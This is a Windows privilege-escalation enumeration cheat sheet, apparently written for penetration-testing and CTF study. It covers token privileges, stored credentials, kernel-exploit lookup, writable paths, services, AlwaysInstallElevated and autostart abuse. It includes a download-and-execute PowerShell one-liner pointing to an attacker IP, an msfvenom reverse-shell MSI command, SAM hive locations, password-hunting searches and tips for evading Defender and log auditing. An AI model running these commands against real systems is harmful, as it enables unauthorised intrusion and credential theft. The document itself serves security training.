# Windows Local Enumeration

The commands here are all for cmd.exe unless specified otherwise. For powershell commands I write "`ps>`" before the command.

* [Whoami?](#whoami)
* [Local Privileges](#local-privileges)
* [Other Users and Groups](#other-users-and-groups)
* [Network](#network)
* [Stored Credentials](#stored-credentials)
* [System Enumeration](#system-enumeration)
* [Interesting Files](#interesting-files)
* [Find Writable Locations](#find-writable-locations)
* [Enum Scripts and Tools](#enum-scripts-and-tools)
* [Installed Software](#installed-software)
* [Service Exploits](#service-exploits)
* [AlwaysInstallElevated](#alwaysinstallelevated)
* [AutoStart Abuse](#autostart-abuse)
* [Scheduled Tasks](#scheduled-tasks)
* [Desperate Measures](#desperate-measures)

## Whoami?

Who are you and what can you do?

```powershell
# whoami (Windows 2003/Vista and later)
## username
whoami

## privileges
whoami /priv

## local groups
whoami /group

## all combined
whoami /all

# net utility current user info
net user %username%

# Alternatives: Without whoami pre-Win 2003
echo %username%
echo %userdomain%
accesschk.exe /accepteula -q -a SeServiceLogonRight
```

### Local Privileges

* Privileges Guide: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
* List of possible Privs: https://docs.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-privilegetype-simpletype
* Access Tokens Guide: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/access-tokens
* (Incomplete) overview of Privs and their impact: https://github.com/gtworek/Priv2Admin

Each user session on the system has an **access token**, which determines the **privileges** of that user logon session. Processes or threads started by a user usually have a limited subset of those privileges. Each process or thread has its own **access token** which determines the privileges it owns. Privileges can either be ENABLED or DISABLED. A disabled privilege might possibly be enabled later, but an absent or removed privilege cannot possibly be acquired again without creating a new token.

Most of the time you are only interested in the privileges that are **both present and enabled**. But under certain circumstances you might be able to create a new token with more previliges and impersonate it. 

You can try to enable disabled privileges with this powershell script: https://github.com/fashionproof/EnableAllTokenPrivs


#### Privileges: Instant Win Tier

* **SeBackupPrivilege** - READ access to ALL files, ignoring ACL (access control list) restrictions (ignore file ownership). Use this to copy SAM, SYSTEM and SECURITY, from which you can extract Admin hashes. [More Info.](./windows/sebackup.md)
* **SeRestorePrivilege** - Same as SeBackupPrivilege, but also allows WRITE access to any file.
* **SeTakeOwnership** - Allows you to take ownership of any *object*, including NTFS files and folders, registry keys, printers, Active Directory objects, services, processes, and threads.
* **SeAssignPrimaryToken** - Allows privesc to SYSTEM user with the [Potato exploits](./windows/potatoes.md). 
* **SeImpersonatePrivilege** - Allows privesc to SYSTEM user with the [Potato exploits](./windows/potatoes.md). Impersonate another token.
* **SeLoadDriverPrivilege** - Load a kernel driver. Allows privesc to SYSTEM using a variety of exploits involving the loading of exploitable drivers. [More Info.](./windows/seloaddrivers.md)
* **SeCreateTokenPrivilege** - Allows you to create arbitrary tokens. But you need another privilege that allows you to impersonate it (like SeImpersonatePrivilege).

The following privs are also instant win tier, though you probably won't find these outside of admin/system sessions anyway. You are probably more interested in using these for further (post-)exploitation when you already have admin/system:

* **SeDebugPrivilege** - Allows you to impersonate LSASS access token. For example this lets you use `privilege::debug` in Mimikatz. 
* **SeTcbPrivilege** - Identifies you as part of the OS. Allows you to impersonate any user access token, including SYSTEM, any local user and the computer account on the network. You might also need SeImpersonatePrivilege (not 100% sure on that, let me know!).

#### Privileges: Useful Tier

* **SeSecurityPrivilege** - Read Security event log. Clear Security event log. Shrink the Security log size. See what events go to the Security log in order to overwrite it (event spam).
* **SeAuditPrivilege** - Write to Security event log directly, allowing you to overwrite it more easily.
* **SeSystemtimePrivilege** - Change system time, messing with the security audit trail. To a lesser degree this also works with SeTimeZonePrivilege (change timezone).


## Other Users and Groups

```powershell
# Enumerate local users
net user

# Enumerate domain users (active directory environments)
net user /domain

# list local groups
net localgroup

# list domain groups (active directory environments)
net group /domain

# list local admins
net localgroup Administrators

# show password policy
net accounts

# active sessions
qwinsta
klist sessions
```

## Network

```powershell
# hostname
hostname

# network interfaces
ipconfig /all 

# Open ports
# You are interested in Listening ports in particular
netstat -ano

# find application by pid (which you got from nestat -ano)
tasklist /fi "pid eq 2216"

# available routes
route print

# known adjacent hosts
arp -a

# print hosts file
type C:\WINDOWS\System32\drivers\etc\hosts
```

## Stored Credentials

Make sure to re-check these whenever you gain access to a new user/session.

```powershell
# show stored credentials
cmdkey /list

# runas using saved credentials
runas /savecred /user:admin C:\PrivEsc\reverseshell.exe
```

```powershell
# AutoLogin
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# possible vnc password locations
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# snmp
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s

# openssh keys
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

Look for common backup locations of the Security Account Manager:
```powershell
# Usually %SYSTEMROOT% = C:\Windows
# you can use icacls or dir to check whether you can find them
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

## System Enumeration

At this point you should look at the OS version and processor architecture if you have not already. 

While you do this you might as well check for kernel exploits and other well-known Windows vulnerabilites. Usually it is a good idea to try less destructive/noisy privesc paths first, but it does not hurt to note these down now, for later when everything else has failed.

```powershell
# print system info overview
systeminfo

# alternative way to find architecture
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% 

# alternative way to find installed patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# list drivers
DRIVERQUERY
```

Save the ouput of `systeminfo` to a text file on your local machine (e.g. `systeminfo.txt`).

Make sure to note down the processor architecture (x64, i386, etc.) for later.


### Windows Exploit Suggester

* Github: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

This checks Windows version / patch history for known exploits:

```bash
# download newest vulnerability database
python windows-exploit-suggester.py --update

# Check systeminfo output (replace xls filename)
python windows-exploit-suggester.py -d [some_date]-mssb.xls -i systeminfo.txt
python windows-exploit-suggester.py -d [some_date]-mssb.xls -i systeminfo.txt > exploit_suggester_output.txt
```


### WES NG

* Github: https://github.com/bitsadmin/wesng

The below wes.py seems to be most up to date and is still getting regular updates, but the downside is that it lists vulns by CVE, rather than MS- number which makes searching for exploits sligthly more annoying. Just use both as needed.

```bash
python wes.py systeminfo_output.txt -i 'Elevation of Privilege' --exploits-only > wes_output.txt
```

### Finding kernel exploits

Easiest ways to find a suitable exploit for a discovered MS-* or CVE:

* Precompiled exploit binaries - https://github.com/SecWiki/windows-kernel-exploits
* Use the `searchsploit` cli tool or look on ExploitDB - https://www.exploit-db.com/
* Google/Duckduckgo/Yandex/Bing - Search for "[insert vuln-id] exploit"

Obviously you should check any exploit for being legit before using it, or you might end up being at the receiving end of the exploit.


## Interesting Files

Luckily people are lazy and leave interesting files lying around for anyone to find.

Check the home directories first:

```powershell
# Vista and newer
dir /a /q /r C:\Users\

# 2000, XP and 2003 
dir /a C:\Documents and Settings\

# NT
dir /a C:\WINNT\Profiles\
```

The tree command can also be helpful, but this might spam your terminal if you have a user directory with a lot of temp files:

```powershell
tree /a /f C:\Users\
tree /a /f C:\Users\Someone\
```

Check **web server directories** for files with credentials for databases or web applications. Remember that users tend to re-use passwords.

```powershell
# IIS web root
C:\Inetpub\wwwroot 
```

For other installed web servers ask google for the common location.

Also check **directories served by FTP or SMB**.


### Recycle Bin

```powershell
dir C:\$Recycle.Bin /s /b
```

### Alternative Data Streams

A somewhat obscure way to hide files are NTFS Alternative Data streams. It's unlikely that you will encounter these in the wild, but I have seen them in CTFs before.

```powershell
# show alternative data streams
dir /R

# print content of data stream
more < somefile.txt:hiddenproof.txt

# hide a binary in a data stream attached to a text file
type somebinary.exe > somefile.txt:hiddenbinary.exe
```

## Find Writable Locations

If you want to transfer binaries or scripts to the target, then you will need a place where you can put them. Otherwise you will need to work in memory only. 
You might have already found one in the previous section, if so then you can skip this.

```powershell
# A simple test is: 
echo test>test.txt
dir /a
# is there a test.txt?
```

But you can of course also check the directory permissions with icacls or accesschk.exe.

```powershell
# Common Temp dir locations
%TEMP%
C:\Windows\TEMP
%USERPROFILE%\AppData\Local\
"%USERPROFILE%\Local Settings\"
%USERPROFILE%\AppData\Local\Temp\
%USERPROFILE%\AppData\Local\Temp\Low\
```

```powershell
# Search for writable locations
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
```

```powershell
# Search for writable locations via powershell
ps> Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
ps> Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

```powershell
# accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
```

Also check **Web Server and FTP server directories**. 

If there is some way to upload files via FTP, HTTP or SMB, then you might wanna try that and see if you can execute files uploaded that way.


## Enum Scripts and Tools 

* See the Windows Enum Scripts cheatsheet
* See the [File Transfer cheatsheet](../file_transfers.md)

Now that you found a writable directory you should transfer and run automatic enum scripts like **Winpeas**, **Powerup**, **JAWS**, **Sherlock**, or **Seatbelt**.

Quite a few of these get picked up by Defender and friends, so you might have to create obfuscated versions.

```powershell
# It's a C# binary (doesn't work on old windows versions)
.\winpeas.exe

# bat version (no pretty colors)
.\winpeas.bat
```

Some of these can be run in-memory-only via powershell, if you did not find any writable directory or cannot execute anything directly this is what you want to do. Sadly this does not protect you from getting picked up by Defender anymore thanks to AMSI.

```powershell
ps> IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/Invoke-SomeScript.ps1'); Invoke-SomeFunctionFromScript
```

* WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
* JAWS -  https://github.com/411Hall/JAWS
* Seatbelt - https://github.com/GhostPack/Seatbelt
* Sherlock - https://github.com/rasta-mouse/Sherlock
* Watson (newer .Net replacement for Sherlock) - https://github.com/rasta-mouse/Watson
* PowerUP - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1


## Installed Software

You are usually looking for weak folder/file permissions on installed software or buffer overflows in non-standard software.

In ExploitDB use the filters for "Windows" and "Local" and search for "privesc".

To see running applications:
```powershell
tasklist
wmic process list full
```

To find non-standard installed applications:
```powershell
.\seatbelt.exe NonstandardProcesses
.\winPEASany.exe quiet procesinfo
```

After finding interesting applications use ExploitDB to search for matching exploits.


## Service Exploits

* See [Service Exploits cheatsheet](./windows/services.md)

List running services:
```default
net start
sc query
```

List all services (including not running):
```default
sc query type= service state= all
```

Check write access on all Windows services (also check your irregular user groups):
```default
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *
.\accesschk.exe /accepteula -uwcqv "Everyone" *
```


## AlwaysInstallElevated

winPEAS should detect this. Verify manually with:

```default
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

It should exist and be set to 1. Then it is exploitable.

To exploit this we need to create an MSI installer reverse shell with msfvenom.

```default
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f msi -o reverse.msi
```

Just copy it over and execute it. You should receive a reverse shell as SYSTEM.


## AutoStart Abuse

Look for registry entries for autostart:

```powershell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

    ...
    My Program  REG_SZ  "C:\Program Files\Autorun Program\program.exe"
```

Check the found binary path with: 

```powershell
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

If you get a result like:
```default
RW BUILTIN\Users

# or...

RW Everyone
```

Then you can overwrite it.

Now if we can write to that binary then we can replace it with an msfvenom payload binary and catch a shell on the next system reboot.


## Scheduled Tasks

This is usually not as interesting as Cron on Linux tends to be.

You can look at scheduled tasks with `schtasks`, but you will get spammed quite a bit. 

You can see the tasks of your own user with:

```powershell
schtasks /query /fo LIST /v
```
or
```powershell
PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

You can see what programs are in the autostart with:
```powershell
wmic startup list full
```


## Desperate Measures

Reached the end of the rope?

Search for files containing the string "password". Adjust the file endings according to your needs.
```powershell
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Search for files with certain filenames like "pass.txt"
```powershell
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

Search the registry for keys or values containing the string "password"
```powershell
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

Also take a look in %APPDATA% (`C:\Users\<user>\AppData\`) for uncommon application data. Enumerate non-standard software and look for sensitive configs.


## References and Useful Links

* fuzzysecurity - **Windows Privilege Escalation Fundamentals** - https://www.fuzzysecurity.com/tutorials/16.html
* Tib3rius - **Windows Privilege Escalation for OSCP & Beyond!** (costs money) - https://www.udemy.com/course/windows-privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
